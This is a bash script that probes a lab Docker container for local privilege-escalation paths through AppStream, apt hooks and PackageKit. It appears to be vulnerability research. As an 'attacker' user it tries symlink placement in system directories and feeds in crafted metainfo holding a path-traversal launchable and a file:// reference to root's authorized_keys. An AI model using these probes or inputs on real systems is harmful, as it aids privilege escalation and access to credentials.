#!/usr/bin/env bash
set -u -o pipefail

container="${CONTAINER:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET_EOF'
set -u -o pipefail

section() {
  printf '\n== %s ==\n' "$1"
}

run_as() {
  local user="$1"
  shift
  runuser -u "$user" -- "$@"
}

cleanup() {
  rm -rf /tmp/as-swcatalog-probe /tmp/as-swcatalog-symlink /tmp/as-swcatalog-apt-home \
    /tmp/as-swcatalog-source /tmp/as-swcatalog-home-attacker /tmp/as-swcatalog-home-selfauth
}
trap cleanup EXIT
cleanup

section "target"
date -u '+utc=%Y-%m-%dT%H:%M:%SZ'
cat /etc/os-release
id attacker
id selfauth

section "package versions"
dpkg-query -W appstream libappstream5 packagekit packagekit-tools apt 2>&1 || true
appstreamcli --version 2>&1 || true

section "apt appstream hook"
ls -l /etc/apt/apt.conf.d/50appstream
sed -n '1,140p' /etc/apt/apt.conf.d/50appstream

section "appstream config and status"
ls -l /usr/share/appstream/appstream.conf
sed -n '1,120p' /usr/share/appstream/appstream.conf
appstreamcli status --verbose 2>&1 | sed -n '1,220p'

section "system path permissions"
for p in \
  /var/cache/swcatalog \
  /var/cache/swcatalog/cache \
  /usr/share/metainfo \
  /usr/share/applications \
  /usr/share/swcatalog \
  /var/lib/swcatalog \
  /var/lib/apt/lists \
  /var/lib/apt/lists/partial \
  /etc/apt/apt.conf.d \
  /usr/local/sbin \
  /usr/local/bin \
  /usr/sbin \
  /usr/bin \
  /usr/bin/appstreamcli \
  /usr/libexec/packagekitd \
  /usr/bin/pkcon; do
  [ -e "$p" ] && namei -l "$p" || printf 'missing %s\n' "$p"
done

section "swcatalog and metainfo contents"
find /var/cache/swcatalog -maxdepth 2 -printf '%M %u %g %s %p -> %l\n' 2>/dev/null | sort
find /usr/share/metainfo -maxdepth 1 -printf '%M %u %g %s %p -> %l\n' 2>/dev/null | sort

section "apt dep11 inputs"
find /var/lib/apt/lists -maxdepth 1 \( -iname '*dep11*' -o -iname '*Components*' \) \
  -printf '%M %u %g %s %p -> %l\n' 2>/dev/null | sort

section "user writability"
for user in attacker selfauth; do
  for p in /var/cache/swcatalog /var/cache/swcatalog/cache /usr/share/metainfo /var/lib/apt/lists /etc/apt/apt.conf.d /usr/local/bin; do
    if run_as "$user" test -w "$p"; then
      writable=yes
    else
      writable=no
    fi
    printf '%s %s writable=%s\n' "$user" "$p" "$writable"
  done
done

section "attacker write and symlink placement attempts"
: > /tmp/as-swcatalog-source
chown attacker:attacker /tmp/as-swcatalog-source
for target in \
  /var/cache/swcatalog/.probe \
  /var/cache/swcatalog/cache/C-local-metainfo.xb \
  /var/cache/swcatalog/cache/C-codex-probe.xb \
  /usr/share/metainfo/codex-probe.metainfo.xml \
  /var/lib/apt/lists/codex-probe_dep11_Components-arm64.yml.gz \
  /usr/local/bin/appstreamcli; do
  out=$(run_as attacker bash -lc "rm -f '$target' 2>/dev/null; ln -sf /tmp/as-swcatalog-source '$target'" 2>&1)
  rc=$?
  printf 'attacker ln %s rc=%s %s\n' "$target" "$rc" "$out"
done
rm -f /tmp/as-swcatalog-source /var/cache/swcatalog/cache/C-codex-probe.xb 2>/dev/null || true

section "attacker appstream user-cache refresh"
mkdir -p /tmp/as-swcatalog-home-attacker
chown attacker:attacker /tmp/as-swcatalog-home-attacker
run_as attacker bash -lc 'set -x; HOME=/tmp/as-swcatalog-home-attacker XDG_CACHE_HOME=/tmp/as-swcatalog-home-attacker/.cache appstreamcli refresh --source=os --force' 2>&1 | sed -n '1,160p'
find /tmp/as-swcatalog-home-attacker -maxdepth 4 -printf '%M %u %g %s %p -> %l\n' 2>/dev/null | sort

section "attacker custom XML datapath refresh"
mkdir -p /tmp/as-swcatalog-probe/data /tmp/as-swcatalog-probe/cache
cat > /tmp/as-swcatalog-probe/data/codex-probe.metainfo.xml <<'XML_EOF'
<?xml version="1.0" encoding="UTF-8"?>
<component type="desktop-application">
  <id>codex.probe.desktop</id>
  <name>Codex Probe</name>
  <summary>Probe metadata</summary>
  <metadata_license>MIT</metadata_license>
  <project_license>MIT</project_license>
  <description><p>Local parser reachability probe.</p></description>
  <launchable type="desktop-id">../../../../tmp/codex-probe.desktop</launchable>
  <url type="homepage">file:///root/.ssh/authorized_keys</url>
</component>
XML_EOF
chown -R attacker:attacker /tmp/as-swcatalog-probe
run_as attacker bash -lc 'set -x; appstreamcli refresh --source=os --force --datapath=/tmp/as-swcatalog-probe/data --cachepath=/tmp/as-swcatalog-probe/cache' 2>&1 | sed -n '1,180p'
find /tmp/as-swcatalog-probe -maxdepth 3 -printf '%M %u %g %s %p -> %l\n' 2>/dev/null | sort

section "attacker apt and packagekit triggers"
run_as attacker bash -lc 'set -x; HOME=/tmp/as-swcatalog-apt-home timeout 20s apt-get update' 2>&1 | sed -n '1,220p'
run_as attacker bash -lc 'set -x; HOME=/tmp/as-swcatalog-home-attacker timeout 25s pkcon refresh force' 2>&1 | sed -n '1,220p'
run_as selfauth bash -lc 'set -x; HOME=/tmp/as-swcatalog-home-selfauth timeout 25s pkcon refresh force' 2>&1 | sed -n '1,220p'

section "packagekit policy and daemon environment"
awk '
  /<action id="org.freedesktop.packagekit.system-sources-refresh"/{p=1}
  p{print}
  p && /<\/action>/{exit}
' /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy
sed -n '1,80p' /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service
pid=$(pidof packagekitd || true)
if [ -n "$pid" ]; then
  printf 'packagekitd pid=%s\n' "$pid"
  tr '\0' '\n' < "/proc/$pid/environ" | grep -E '^(PATH|HOME|USER|LOGNAME|SHELL)=' | sort || true
else
  echo 'packagekitd not running'
fi

section "controlled root cache symlink sink"
rm -rf /tmp/as-swcatalog-symlink
mkdir -p /tmp/as-swcatalog-symlink/data /tmp/as-swcatalog-symlink/cache
cp /usr/share/metainfo/org.freedesktop.appstream.cli.metainfo.xml /tmp/as-swcatalog-symlink/data/
chown -R attacker:attacker /tmp/as-swcatalog-symlink
cache_name=$(run_as attacker bash -lc 'appstreamcli refresh --source=os --force --datapath=/tmp/as-swcatalog-symlink/data --cachepath=/tmp/as-swcatalog-symlink/cache >/dev/null 2>&1; basename /tmp/as-swcatalog-symlink/cache/*.xb' 2>/dev/null)
rm -f /tmp/as-swcatalog-symlink/cache/*.xb /tmp/as-swcatalog-symlink/victim
ln -s /tmp/as-swcatalog-symlink/victim "/tmp/as-swcatalog-symlink/cache/$cache_name"
chown -h attacker:attacker "/tmp/as-swcatalog-symlink/cache/$cache_name"
printf 'preplaced cache symlink name=%s\n' "$cache_name"
find /tmp/as-swcatalog-symlink -maxdepth 2 -printf '%M %u %g %s %p -> %l\n' | sort
appstreamcli refresh --source=os --force --datapath=/tmp/as-swcatalog-symlink/data --cachepath=/tmp/as-swcatalog-symlink/cache 2>&1 | sed -n '1,120p'
find /tmp/as-swcatalog-symlink -maxdepth 2 -printf '%M %u %g %s %p -> %l\n' | sort
echo 'note: this sink requires root to use an attacker-writable cachepath; default /var/cache/swcatalog/cache is not attacker-writable.'

section "cleanup verification"
cleanup
for p in /tmp/as-swcatalog-probe /tmp/as-swcatalog-symlink /tmp/as-swcatalog-apt-home /tmp/as-swcatalog-source /tmp/as-swcatalog-home-attacker /tmp/as-swcatalog-home-selfauth; do
  [ -e "$p" ] && printf 'leftover %s\n' "$p" || printf 'removed %s\n' "$p"
done
TARGET_EOF
